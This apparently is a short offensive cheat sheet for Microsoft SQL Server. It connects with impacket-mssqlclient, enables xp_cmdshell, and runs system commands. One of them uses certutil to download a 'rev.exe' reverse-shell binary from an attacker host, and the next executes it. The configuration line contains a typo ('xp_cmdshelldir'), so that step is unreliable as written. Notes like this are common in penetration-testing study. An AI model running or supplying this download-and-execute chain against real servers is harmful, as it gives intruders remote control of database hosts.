

select name from sys.databases;



# Enabling xp_cmdshell feature
impacket-mssqlclient $USER:$PASS@$IP -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshelldir', 1;
RECONFIGURE;

# Executing Commands via xp_cmdshell
EXECUTE xp_cmdshell 'whoami';
EXECUTE xp_cmdshell 'certutil.exe -urlcache -f http://$IP/rev.exe c:\\windows\\temp\\rev.exe';
EXECUTE xp_cmdshell 'c:\\windows\\temp\\rev.exe';